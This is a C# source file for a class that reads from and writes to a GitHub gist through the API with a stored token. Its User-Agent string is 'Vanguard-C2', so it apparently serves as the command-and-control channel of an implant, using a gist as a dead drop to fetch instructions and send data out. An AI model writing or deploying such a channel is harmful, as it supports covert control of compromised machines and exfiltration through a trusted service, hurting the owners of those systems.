using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text.Json;

namespace VanguardCore
{
    public class GistManager
    {
        private static readonly string GistId = SafetyManager.GetSecret("GIST_PROXY_ID");
        private static readonly string Token = SafetyManager.GetSecret("GIST_GITHUB_TOKEN");
        private static readonly HttpClient _client = new HttpClient();

        static GistManager()
        {
            _client.DefaultRequestHeaders.Add("Authorization", $"token {Token}");
            _client.DefaultRequestHeaders.Add("User-Agent", "Vanguard-C2");
        }

        public static async Task<Dictionary<string, string>> GetFiles()
        {
            try
            {
                var response = await _client.GetAsync($"https://api.github.com/gists/{GistId}");
                if (!response.IsSuccessStatusCode) return new Dictionary<string, string>();

                var json = await response.Content.ReadAsStringAsync();
                using var doc = JsonDocument.Parse(json);
                var filesNode = doc.RootElement.GetProperty("files");
                var result = new Dictionary<string, string>();

                foreach (var file in filesNode.EnumerateObject())
                {
                    result[file.Name] = file.Value.GetProperty("content").GetString();
                }
                return result;
            }
            catch { return new Dictionary<string, string>(); }
        }

        public static async Task<string?> GetFileContent(string fileName)
        {
            try
            {
                var files = await GetFiles();
                if (files.TryGetValue(fileName, out var content))
                    return content;
            }
            catch { }
            return null;
        }

        public static async Task<bool> UpdateFile(string fileName, string content)
        {
            try
            {
                // AOT-Safe: Manual JSON construction to avoid reflection
                string jsonEscaped = content.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
                string json = "{\"files\":{\"" + fileName + "\":{\"content\":\"" + jsonEscaped + "\"}}}";

                var request = new HttpRequestMessage(new HttpMethod("PATCH"), $"https://api.github.com/gists/{GistId}")
                {
                    Content = new StringContent(json, Encoding.UTF8, "application/json")
                };

                var response = await _client.SendAsync(request);
                return response.IsSuccessStatusCode;
            }
            catch { return false; }
        }
    }
}
